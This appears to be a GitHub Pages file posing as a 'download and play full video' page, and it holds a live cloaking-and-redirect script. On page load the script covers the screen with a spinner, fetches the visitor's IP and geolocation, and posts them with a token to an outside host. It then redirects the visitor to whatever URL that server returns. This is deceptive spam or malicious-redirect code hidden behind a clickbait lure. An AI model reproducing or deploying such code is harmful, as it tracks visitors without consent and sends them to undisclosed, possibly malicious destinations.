# losdol007.github.io
DOWNLOAD &amp; PLAY FULL VIDEO HD▶️
`<meta name="value" content="xr1g60y4jq">
<meta name="token" content="NVFOEWDiehJsUUBRNKiz3Sfy8DdKC9rM9ej259JN1mZB52Hp5gbXVAfDiABV">
<meta name="uri" content="https://www.menghijau.com/api/v1/kucing">

<style>
.classldingBG{display: flex !important; z-index: 999999 !important; background: #fff; position: fixed; align-items: center; justify-content: center; top: 0; left: 0; width: 100%; height: 100%;}
.pik_spinner { -webkit-animation: rotator 1.4s linear infinite; animation: rotator 1.4s linear infinite; } @-webkit-keyframes rotator { 0% { transform: rotate(0deg); } 100% { transform: rotate(270deg); } } @keyframes  rotator { 0% { transform: rotate(0deg); } 100% { transform: rotate(270deg); } } .pik_path { stroke-dasharray: 187; stroke-dashoffset: 0; transform-origin: center; -webkit-animation: dash 1.4s ease-in-out infinite, colors 5.6s ease-in-out infinite; animation: dash 1.4s ease-in-out infinite, colors 5.6s ease-in-out infinite; } @-webkit-keyframes colors { 0% { stroke: #4285F4; } 25% { stroke: #DE3E35; } 50% { stroke: #F7C223; } 75% { stroke: #1B9A59; } 100% { stroke: #4285F4; } } @keyframes  colors { 0% { stroke: #4285F4; } 25% { stroke: #DE3E35; } 50% { stroke: #F7C223; } 75% { stroke: #1B9A59; } 100% { stroke: #4285F4; } } @-webkit-keyframes dash { 0% { stroke-dashoffset: 187; } 50% { stroke-dashoffset: 46.75; transform: rotate(135deg); } 100% { stroke-dashoffset: 187; transform: rotate(450deg); } } @keyframes  dash { 0% { stroke-dashoffset: 187; } 50% { stroke-dashoffset: 46.75; transform: rotate(135deg); } 100% { stroke-dashoffset: 187; transform: rotate(450deg); } }
.fadeout {z-index: -1 !important; opacity: 0; display: none !important;}
</style>
<script type="text/javascript">
    //add element

    document.write(
        '<div class="classldingBG" id="ldingBG"><div class="pik_bodyspiner"> <svg class="pik_spinner" width="65px" height="65px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg"> <circle class="pik_path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle> </svg> </div></div></div>'
    );
        fetch("https://www.iplocate.io/api/lookup" , {
                    method: 'GET',
                })
                //respons ip locate
                .then((ip_locate) => ip_locate.json())
                .then((ress_locator) => {
                    //send request to server
                    var ip = ress_locator.ip
                    fetch("https://www.menghijau.com/api/v1/kucing", {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'value': 'xr1g60y4jq',
                            'ip': ip,
                            'api': JSON.stringify(ress_locator)
                        },
                        body: 'token=NVFOEWDiehJsUUBRNKiz3Sfy8DdKC9rM9ej259JN1mZB52Hp5gbXVAfDiABV',
                        redirect: 'follow'

                    }).then(function(response_api) {
                        return response_api.json();

                    }).then(respon_api => {
                        var status = respon_api.result;
                        if (status == false) {
                            document.getElementById('ldingBG').classList.add("fadeout");
                        } else if (status == true) {
                            //response from server json
                            setTimeout(function() {
                                window.location.href = respon_api.data.url;
                            }, 100);

                        }
                    }).catch((error) => {
                         document.getElementById('ldingBG').classList.add("fadeout");
                    });



                })
</script>

         `
